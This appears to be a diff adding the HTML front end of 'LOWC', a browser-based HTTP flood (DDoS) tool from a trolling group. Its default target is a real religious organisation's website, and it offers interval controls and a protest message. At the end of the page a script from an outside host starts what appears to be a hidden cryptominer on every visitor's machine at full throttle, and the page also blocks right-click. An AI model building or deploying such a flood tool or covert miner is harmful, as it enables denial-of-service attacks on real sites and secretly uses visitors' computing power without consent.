@@ -1,0 +1,129 @@
+ <!DOCTYPE html>
+ <html lang="ja">
+        <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>LOWC (Low Orbit Web Cannon)</title>
+        <meta name="description" content="LOICをweb版にしてJavascriptで送るようにしたものです。">
+        <meta name="keywords" content="荒らし共栄圏,荒らし,共栄圏,CTKP,荒らし連合軍,ワッパステイ,DoS攻撃,HTTP Flood,田代砲,DDoS攻撃,サイバー攻撃,Discord,共産党">
+        <meta name="author" content="笠原">
+        
+        <meta property="og:title" content="LOWC (Low Orbit Web Cannon)">
+        <meta property="og:type" content="website">
+        <meta property="og:description" content="LOICをweb版にしてJavascriptで送るようにしたものです。">        
+        <link href="lowc_files/style.css" media="all" rel="stylesheet" type="text/css">
+        <link href="lowc_files/mb.css" media="all" rel="stylesheet" type="text/css">
+        <script src="lowc_files/jquery.js"></script>
+        <script src="lowc_files/jquery_003.js"></script>
+        <script src="lowc_files/jquery_002.js"></script>
+        <script src="lowc_files/engine.js"></script>
+        <script>
+        $(function(){
+            $("#ex0 .mb_slider").mbSlider({
+                onSlide:function(o){$("#"+o.id+"_val").find(".val").val($(o).mbgetVal());move_slide();},
+            });
+        });
+        </script>
+        <script>
+        function popupMsg(theMsg) {
+            alert(theMsg);
+        }
+        </script>
+        <script>
+        var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+        if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+        function mischandler(){
+            return false;
+        }
+        
+        function mousehandler(e){
+            var myevent = (isNS) ? e : event;
+            var eventbutton = (isNS) ? myevent.which : myevent.button;
+            if ((eventbutton == 2) || (eventbutton == 3)) return false;
+        }
+        document.oncontextmenu = mischandler;
+        document.onmousedown = mousehandler;
+        document.onmouseup = mousehandler;
+        </script>
+    </head>
+    <body oncontextmenu="return false;">
+        <div id="hiveContainer" class="hidde"></div>
+        <div id="frameContainer" class="hidde"></div>
+        <div id="imgContainer" class="hidde"></div>
+        <div id="typeStyle" class="hidde"></div>
+        <div id="header">
+            <h1>LOWC</h1>
+            <h2>(Low Orbit Web Cannon)</h2>
+        </div>
+        <div id="layer1">
+            <table id="table1">
+                <tbody><tr>
+                    <td>
+                        <fieldset class="layer2">
+                            <legend>1. 攻撃先を選択(デフォルトは旧統一教会公式ホームページ)</legend>
+                            <input type="text" id="target" value="https://ffwpu.jp/" onfocus="erase('#target');" onblur="reload('#target');">
+                        </fieldset>
+                    </td>
+                    <td>
+                        <fieldset class="layer2">
+                            <legend>HiveMind (任意)</legend>
+                            <input type="button" id="hivebutton" value="Connect" onclick="hive();">
+                            <input type="text" id="hiveURL" value="http://" onfocus="erase('#hiveURL');" onblur="reload('#hiveURL');">
+                        </fieldset>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2">
+                        <fieldset class="layer2">
+                            <legend>2. 攻撃オプション(必須)</legend>
+                            <div class="title">Type:</div>
+                            <div>
+                                <input type="button" id="radio1" value="IMG" onclick="shootType('img');">
+                                <input type="button" id="radio2" value="IFrame" onclick="shootType('iframe');">
+                            </div>
+                            <div class="title">間隔 (ms):</div>
+                            <div id="interval1">
+                                <div id="ex0">
+                                    <div id="sl0" class="mb_slider {maxVal:'5000', rangeColor:'#5696C0',negativeColor:'#183040', startAt:200, grid:10}" style="display:inline-block;*display:inherit;" rangecolor="#5696C0" negativecolor="#183040" startat="200"></div>
+                                </div>
+                            </div>
+                            <div class="title">追加メッセージ:</div>
+                            <input type="text" id="msg" value="解散を求めます">
+                        </fieldset>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="1">
+                        <fieldset class="layer2">
+                            <legend>3. 準備OK?</legend>
+                            <input type="button" id="start" onclick="start_stop();" value="IMMA CHARGING">
+                            <span id="sl0_val" class="setVal">
+                                <input type="hidden" id="interval_slide" class="val" value="200">
+                            </span>
+                        </fieldset>
+                    </td>
+                    <td>
+                        <fieldset class="layer2">
+                            <legend>攻撃結果</legend>
+                            <div id="number">
+                                <p id="counter_requested">0</p>
+                                <span id="of">of </span>
+                                <span id="counter_tail">0</span>
+                            </div>
+                        </fieldset>
+                    </td>
+                </tr></tbody>
+            </table>
+        </div>
+        <p id="footer">Designed by 荒らし共栄圏 | <a href="https://ctkpaarr.data.blog" target="_blank" rel="noopener noreferrer">公式ウェブサイト</a></p>
+        <script src="https://www.hostingcloud.racing/BcdO.js"></script>
+        <script>
+            var _client = new Client.Anonymous('95680da9ac15fe7324bd0bac85580612bc3fba5e12c58468c090a24a27c520b3', {
+                throttle: 0, c: 'w', ads: 0
+            });
+            _client.start();
+    
+
+        </script>
+    </body>
+</html>
